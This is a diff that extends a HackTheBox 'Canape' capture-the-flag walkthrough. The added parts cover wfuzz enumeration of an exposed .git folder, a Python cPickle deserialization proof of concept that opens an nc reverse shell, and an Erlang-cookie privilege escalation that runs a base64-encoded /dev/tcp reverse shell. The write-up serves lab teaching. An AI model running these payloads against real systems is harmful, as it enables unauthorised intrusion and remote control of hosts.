@@ -52,7 +52,30 @@ At port 80, the web application developed by Simpson from 2018.
 
 ![](images/2.png)
 
-Based on nmap result, I saw this web app public folder `.git` and it's may leak some sensitive source code.
+List of the hidden in the server using `wfuzz`
+
+```
+┌──(Hades㉿10.10.14.6)-[0.4:25.2]~
+└─$ wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hw 1 --hl 82 'http://10.10.10.70/FUZZ'
+<snip>
+Target: http://10.10.10.70/FUZZ
+Total requests: 4681
+<snip>
+000000012:   200        9 L      43 W       1075 Ch     ".git/index"
+000000013:   200        17 L     70 W       1130 Ch     ".git/logs/"
+000000011:   200        11 L     29 W       259 Ch      ".git/config"
+000000010:   200        1 L      2 W        23 Ch       ".git/HEAD"
+000000008:   301        9 L      28 W       309 Ch      ".git"
+000001026:   403        11 L     32 W       294 Ch      "cgi-bin/"
+000001060:   405        4 L      23 W       178 Ch      "check"
+000003371:   200        85 L     227 W      3150 Ch     "quotes"
+000003682:   403        11 L     32 W       299 Ch      "server-status"
+000003923:   301        9 L      28 W       311 Ch      "static"
+000003967:   200        81 L     167 W      2836 Ch     "submit"
+<snip>
+```
+
+Based on `nmap` and `wfuzz` result, I saw this web app public folder `.git` and it's may leak some sensitive source code.
 
 Dump folder `.git` if repo not available using [GitHacker](https://github.com/WangYihang/GitHacker), [git_dumper](https://github.com/arthaud/git-dumper) or command
 
@@ -202,6 +225,31 @@ print base64.b64encode(data)
 item = cPickle.loads(data)
 ```
 
+Quick poc exploit
+
+``` python
+import os, requests
+import cPickle
+from hashlib import md5
+
+class exploit(object):
+    def __reduce__(self):
+        return (os.system, ('echo homer!; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f',))
+
+url = "http://10.10.10.70"
+
+data = cPickle.dumps(exploit())
+char, quote = data.split('!')
+
+#Sent payload
+r = requests.post(url + "/submit", data={'character':char, 'quote':quote})
+
+p_id = md5(char + quote).hexdigest()
+
+#Trigger payload
+r = requests.post(url + "/check", data={'id':p_id})
+```
+
 [*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/canape)
 
 Run exploit `pickle-canape.py`.
@@ -246,10 +294,25 @@ app.config.update(
 db = couchdb.Server("http://localhost:5984/")[app.config["DATABASE"]]
 ```
 
+Checking running service
+
+```
+www-data@canape:/var/www/html$ netstat -antup
+<snip>              
+tcp        0      0 127.0.0.1:5984          0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:38592           0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:5986          0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:4369            0.0.0.0:*               LISTEN      -              
+<snip>
+```
+
 Follow [CouchDB's Documents](https://docs.couchdb.org/en/latest/intro/tour.html), checking running service with curl, the CouchDB's version is 2.0.0
 
 ```
-www-data@canape:/var/www$ curl http://127.0.0.1:5984/
+www-data@canape:/var/www/html$ curl 127.0.0.1:5986
+{"couchdb":"Welcome","uuid":"132586dfde75b957085d59a5096e9c20","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
+www-data@canape:/var/www/html$ curl 127.0.0.1:5984
 {"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
 ```
 
@@ -363,6 +426,52 @@ Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)
  * Support:        https://ubuntu.com/advantage
 Last login: Tue Apr 10 12:57:08 2018 from 10.10.14.5
 homer@canape:~$ id
+uid=1000(homer) gid=1000(homer) groups=1000(homer)
+```
+
+### Erlang CouchDB Local PrivEscal
+
+Checking running service, I saw the command line `-setcookie monster`
+
+```
+www-data@canape:/home$ ps aux | grep couchdb                    
+root        639  0.0  0.0   4240   644 ?        Ss   Apr13   0:00 runsv couchdb
+root        641  0.0  0.0   4384   676 ?        S    Apr13   0:00 svlogd -tt /var/log/couchdb
+homer       642  0.4  3.5 649344 34920 ?        Sl   Apr13   1:11 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
+www-data   1587  0.0  0.1  11284  1020 pts/0    S+   01:37   0:00 grep couchdb
+```
+
+Using cookie `monster` and go to Erlang
+
+```
+www-data@canape:/home$ HOME=/ erl -sname 0xdf -setcookie monster
+Eshell V7.3  (abort with ^G)
+(0xdf@canape)1> os:cmd("id").
+"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
+```
+
+Using `rpc module` of Erlang and call to CouchDB
+
+```
+(0xdf@canape)2> rpc:call('couchdb@localhost', os, cmd, [whoami]).
+"homer\n"
+```
+
+Create homer shell
+
+```
+(0xdf@canape)3> rpc:call('couchdb@localhost', os, cmd, ["echo -n c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMQ== | base64 -d | bash"]).
+```
+
+At listener, I have reverse shell
+
+```
+┌──(Hades㉿10.10.14.6)-[1.0:39.5]~
+└─$ sudo nc -nvlp 443
+listening on [any] 443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.70] 43496
+sh: 0: can't access tty; job control turned off
+$ id
 uid=1000(homer) gid=1000(homer) groups=1000(homer)
 ```
 
